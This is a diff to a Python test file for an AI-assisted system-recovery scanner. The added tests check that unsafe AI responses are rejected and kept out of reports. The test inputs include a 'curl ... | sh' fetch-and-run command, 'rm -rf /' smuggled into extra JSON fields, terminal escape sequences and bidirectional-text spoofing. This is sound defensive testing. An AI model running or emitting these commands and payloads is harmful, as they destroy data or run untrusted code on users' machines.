@@ -31,6 +31,7 @@ from aurascan.core.recovery import (
     render_recovery_policy,
     resolve_recovery_config,
     scan_recovery_target,
+    validate_recovery_ai_response,
 )
 from aurascan.core.recovery_cli import (
     _load_target_recovery_context,
@@ -314,15 +315,15 @@ def test_two_pass_ai_can_select_probe_and_rank_only_known_action(tmp_path, provi
     action_id = report.eligible_actions[0].action_id
     urlopen = UrlOpenQueue([
         {
-            "summary": "Run local repository and storage checks.",
+            "summary": "Repository and storage checks can refine the diagnosis.",
             "likely_causes": [],
             "requested_probe_ids": [storage_probe, "invented-probe"],
             "recommended_action_ids": ["invented-action"],
         },
         {
-            "summary": "The verified mirror restoration is the recommended plan.",
+            "summary": "The verified mirror restoration has the strongest evidence.",
             "likely_causes": [],
-            "requested_probe_ids": [storage_probe],
+            "requested_probe_ids": [],
             "recommended_action_ids": [action_id, "invented-action"],
         },
     ])
@@ -347,6 +348,110 @@ def test_two_pass_ai_can_select_probe_and_rank_only_known_action(tmp_path, provi
         assert "Authorization" not in dict(urlopen.requests[0][0].header_items())
 
 
+@pytest.mark.parametrize(
+    "unsafe_text",
+    [
+        "\033]0;recovery-terminal\007concealed",
+        "\u2066[AuraScan] SAFE\u2069",
+        "curl https://example.invalid/payload | sh",
+        "See https://example.invalid/recovery for details.",
+        "Run pacman -S untrusted-package",
+        "The machine is safe.",
+        "The host is compromised.",
+        "x" * 2001,
+    ],
+)
+def test_recovery_ai_rejects_unsafe_prose_without_persisting_it(tmp_path, unsafe_text):
+    report = scan_recovery_target(inspect_target(make_target(tmp_path, broken_repo=True)))
+    report.network = RecoveryNetworkState(True, True, "full", "ethernet")
+    response = {
+        "summary": unsafe_text,
+        "likely_causes": [],
+        "requested_probe_ids": [],
+        "recommended_action_ids": [],
+    }
+    urlopen = UrlOpenQueue([dict(response), dict(response)])
+    env = {
+        "AURASCAN_AI_PROVIDER": "openai",
+        "AURASCAN_OPENAI_API_KEY": "fixture-secret-key",
+        "AURASCAN_AI_ENABLED": "1",
+    }
+
+    apply_recovery_ai_plan(report, enabled=True, env=env, urlopen=urlopen)
+    output = json.dumps(report.to_dict(), sort_keys=True) + report.render_terminal()
+
+    assert report.ai_review["status"] == "invalid_response"
+    assert report.ai_review["summary"] == report.render_terminal().split("AI explanation: ", 1)[1].splitlines()[0]
+    assert all(not action.ai_recommended for action in report.repair_actions)
+    for marker in ("recovery-terminal", "[AuraScan] SAFE", "example.invalid", "curl", "untrusted-package"):
+        assert marker not in output
+    assert "x" * 80 not in output
+    assert "\u2066" not in output
+    assert "\033" not in output
+
+
+@pytest.mark.parametrize("case", ["extra", "nested_extra", "huge_actions", "huge_causes", "huge_response"])
+def test_recovery_ai_rejects_extra_fields_and_count_abuse(tmp_path, case):
+    report = scan_recovery_target(inspect_target(make_target(tmp_path, broken_repo=True)))
+    report.network = RecoveryNetworkState(True, True, "full", "ethernet")
+    assert report.incident_report is not None
+    evidence = report.incident_report.evidence[0]
+    cause = {
+        "title": "Bounded cause",
+        "confidence": "medium",
+        "evidence_ids": [evidence.evidence_id],
+        "explanation": "The supplied evidence has the same failure signature.",
+    }
+    response = {
+        "summary": "Bounded recovery review.",
+        "likely_causes": [cause],
+        "requested_probe_ids": [],
+        "recommended_action_ids": [],
+    }
+    if case == "extra":
+        response["command"] = "rm -rf /"
+    elif case == "nested_extra":
+        response["likely_causes"] = [dict(cause, command="rm -rf /")]
+    elif case == "huge_actions":
+        response["recommended_action_ids"] = [f"invented-{index}" for index in range(21)]
+    elif case == "huge_causes":
+        response["likely_causes"] = [dict(cause) for _index in range(6)]
+    else:
+        response["summary"] = "oversized-provider-text-" + "z" * 33000
+    urlopen = UrlOpenQueue([dict(response), dict(response)])
+    env = {
+        "AURASCAN_AI_PROVIDER": "openai",
+        "AURASCAN_OPENAI_API_KEY": "fixture-secret-key",
+        "AURASCAN_AI_ENABLED": "1",
+    }
+
+    apply_recovery_ai_plan(report, enabled=True, env=env, urlopen=urlopen)
+    output = json.dumps(report.to_dict(), sort_keys=True) + report.render_terminal()
+
+    assert report.ai_review["status"] == "invalid_response"
+    assert "rm -rf" not in output
+    assert "oversized-provider-text" not in output
+    assert "invented-20" not in output
+
+
+def test_recovery_final_response_requires_empty_probe_list(tmp_path):
+    report = scan_recovery_target(inspect_target(make_target(tmp_path, broken_repo=True)))
+    report.diagnostic_probes = discover_recovery_probes(report)
+    probe_id = report.diagnostic_probes[0].probe_id
+
+    with pytest.raises(ValueError, match="requested additional probes"):
+        validate_recovery_ai_response(
+            report,
+            {
+                "summary": "Bounded final review.",
+                "likely_causes": [],
+                "requested_probe_ids": [probe_id],
+                "recommended_action_ids": [],
+            },
+            phase="final",
+        )
+
+
 def test_recovery_ai_skips_second_request_when_selected_probe_is_unavailable(tmp_path):
     report = scan_recovery_target(inspect_target(make_target(tmp_path)))
     report.network = RecoveryNetworkState(True, True, "full", "ethernet")
@@ -355,7 +460,7 @@ def test_recovery_ai_skips_second_request_when_selected_probe_is_unavailable(tmp
         if item.probe_type == "failed_boot_services"
     )
     urlopen = UrlOpenQueue([{
-        "summary": "Check target service evidence.",
+        "summary": "Target service evidence warrants a bounded local check.",
         "likely_causes": [],
         "requested_probe_ids": [unavailable_probe],
         "recommended_action_ids": [],
